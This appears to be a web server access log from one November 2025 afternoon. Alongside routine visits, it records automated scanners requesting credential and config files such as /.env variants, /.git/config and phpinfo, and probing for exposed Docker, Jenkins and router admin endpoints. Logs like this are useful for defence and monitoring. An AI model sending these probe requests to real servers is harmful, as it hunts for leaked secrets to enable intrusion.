43.139.65.242 - - [12/Nov/2025:16:08:25 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
43.139.65.242 - - [12/Nov/2025:16:08:25 +0800] "GET /containers/json HTTP/1.1" 404 153 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
204.76.203.219 - - [12/Nov/2025:16:27:08 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
93.174.93.12 - - [12/Nov/2025:16:34:23 +0800] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-"
172.202.117.217 - - [12/Nov/2025:16:38:22 +0800] "GET /hudson HTTP/1.1" 404 153 "-" "Mozilla/5.0 zgrab/0.x"
213.209.157.254 - - [12/Nov/2025:16:45:27 +0800] "GET /.git/config HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
204.76.203.219 - - [12/Nov/2025:16:55:25 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.219 - - [12/Nov/2025:17:25:15 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.219 - - [12/Nov/2025:17:55:39 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.219 - - [12/Nov/2025:18:25:17 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
65.49.1.10 - - [12/Nov/2025:18:29:59 +0800] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03g\xFC3B$\x82vbI\x97\xDAc\x15&G\xA2`\xBB\xEEG\x8F\xC7M\xF2Vu\xE3\x8A\xD5\x18>\xCF\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
204.76.203.219 - - [12/Nov/2025:18:53:45 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
124.222.231.251 - - [12/Nov/2025:18:54:41 +0800] "GET /api/Game/GetFullGameScheduleByDate?gameDate=2025-11-12&gameTypeID=0&hotStatus=1 HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Trailer/93.3.3570.29"
78.153.140.176 - - [12/Nov/2025:18:55:24 +0800] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)"
78.153.140.176 - - [12/Nov/2025:18:55:25 +0800] "GET /api/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
78.153.140.176 - - [12/Nov/2025:18:55:26 +0800] "GET /backend/.env HTTP/1.1" 404 153 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0) Opera 7.11  [fr]"
78.153.140.176 - - [12/Nov/2025:18:55:26 +0800] "GET /admin/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11"
78.153.140.176 - - [12/Nov/2025:18:55:28 +0800] "GET /.env.example HTTP/1.1" 404 153 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.01"
78.153.140.176 - - [12/Nov/2025:18:55:28 +0800] "GET /app_dev.php/_profiler/phpinfo HTTP/1.1" 404 153 "-" "More Safari 3.2.1 user agents strings -->>"
78.153.140.176 - - [12/Nov/2025:18:55:30 +0800] "GET /?phpinfo=-1 HTTP/1.1" 200 3958 "-" "FAST-WebCrawler/3.8 (crawler at trd dot overture dot com; http://www.alltheweb.com/help/webmaster/crawler)"
78.153.140.176 - - [12/Nov/2025:18:55:30 +0800] "GET /debug/default/view?panel=config HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.2 Safari/532.2"
78.153.140.176 - - [12/Nov/2025:18:55:31 +0800] "GET /images/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; U; Linux i686; de; rv:1.8.1.1) Gecko/20061220 Firefox/2.0.0.1 (Swiftfox)"
193.142.147.209 - - [12/Nov/2025:19:06:11 +0800] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
93.174.93.12 - - [12/Nov/2025:19:15:31 +0800] "GET / HTTP/1.0" 200 3958 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36"
204.76.203.219 - - [12/Nov/2025:19:22:20 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
103.252.89.75 - - [12/Nov/2025:19:38:05 +0800] "GET / HTTP/1.1" 200 3958 "-" "-"
204.76.203.219 - - [12/Nov/2025:19:54:40 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
64.62.197.107 - - [12/Nov/2025:19:56:13 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
64.62.197.107 - - [12/Nov/2025:19:57:13 +0800] "GET /webui/ HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15"
